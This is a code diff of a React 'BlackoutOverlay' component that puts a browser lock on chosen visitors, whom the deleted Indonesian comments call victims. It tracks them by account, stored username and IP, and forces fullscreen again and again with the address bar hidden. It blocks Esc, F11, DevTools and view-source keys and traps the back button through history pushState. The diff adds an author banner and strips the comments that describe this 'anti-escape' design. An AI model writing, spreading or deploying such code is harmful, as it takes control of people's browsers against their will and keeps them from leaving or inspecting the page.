@@ -1,3 +1,10 @@
+/*
+  nexus://o8.2 build
+  author & every line: OKTAGRAM
+  OKTAGRAM YANG MENULIS INI JIKA BERANI BONGKAR BONGKAR
+  sig://oktagram
+*/
+
 import { useCallback, useEffect, useRef, useState } from 'react';
 import { useStore } from '../lib/store';
 import { rpcGetBlackout, rpcGetBlackoutIp, rpcGetBlackoutPublic } from '../lib/api';
@@ -40,12 +47,9 @@ export default function BlackoutOverlay() {
         setB(active);
         return;
       }
-      // Tanpa akun & tanpa username tersimpan: jebakan IP. Nangkep korban yang
-      // sempat hapus data situs / localStorage biar enggak kabur dari hitam.
       const ipActive = await rpcGetBlackoutIp();
       setB(ipActive);
     } catch {
-      /* jaringan / bukan korban */
     }
   }, [setB]);
 
@@ -54,9 +58,6 @@ export default function BlackoutOverlay() {
   }, [me?.id, check]);
 
   useEffect(() => {
-    // Cek langsung begitu halaman kebuka (biar refresh/buka lagi langsung hitam),
-    // lalu lanjut polling tiap 4 detik. Polling selalu jalan: user login cek by ID,
-    // user anonim cek by username tersimpan, lalu by IP.
     check();
     const t = setInterval(check, POLL_MS);
     const onVis = () => {
@@ -78,24 +79,15 @@ export default function BlackoutOverlay() {
     });
   }, [setB]);
 
-  // ---- SISTEM ANTI-KABUR ----
-  // Blokir semua jalan keluar: F11/F12/Esc/F10 & combo DevTools (Ctrl+Shift+I/J/C,
-  // Ctrl+U/P/S), tombol back (history trap), reload/close (beforeunload),
-  // contextmenu, scroll, seleksi. Setiap interaksi korban langsung balik
-  // fullscreen (<1 detik) — interval retry + event gesture (klik/ketik/tap)
-  // menjamin layar selalu penuh.
   useEffect(() => {
     if (!blacked) return;
 
-    // Flag anti-stack: jangan tumpuk requestFullscreen bertubi-tubi (bikin browser
-    // throttle). Satu request jalan, sisanya nunggu event gesture berikutnya.
     let fsPending = false;
     const enter = () => {
       try {
         if (document.fullscreenElement || fsPending) return;
         const el = document.documentElement;
         if (typeof el.requestFullscreen !== 'function') return;
-        // navigationUI: 'hide' — sembunyikan address bar di fullscreen.
         fsPending = true;
         const p = el.requestFullscreen({ navigationUI: 'hide' });
         p.then(
@@ -120,8 +112,6 @@ export default function BlackoutOverlay() {
       if (blocked) {
         e.preventDefault();
         e.stopPropagation();
-        // setTimeout(0) masih di dalam jendela user-activation (~5 dtk) —
-        // request fullscreen tetap dianggap "pengguna meminta".
         window.setTimeout(enter, 0);
       }
       enter();
@@ -147,12 +137,10 @@ export default function BlackoutOverlay() {
       enter();
     };
 
-    // Tombol Back / mouse back = jebakan: tiap popstate, dorong state baru.
     const trapBack = () => {
       try {
         window.history.pushState({ nexus: true }, '');
       } catch {
-        /* noop */
       }
     };
 
@@ -209,7 +197,6 @@ export default function BlackoutOverlay() {
         try {
           document.exitFullscreen?.().catch(() => {});
         } catch {
-          /* noop */
         }
       }
     };
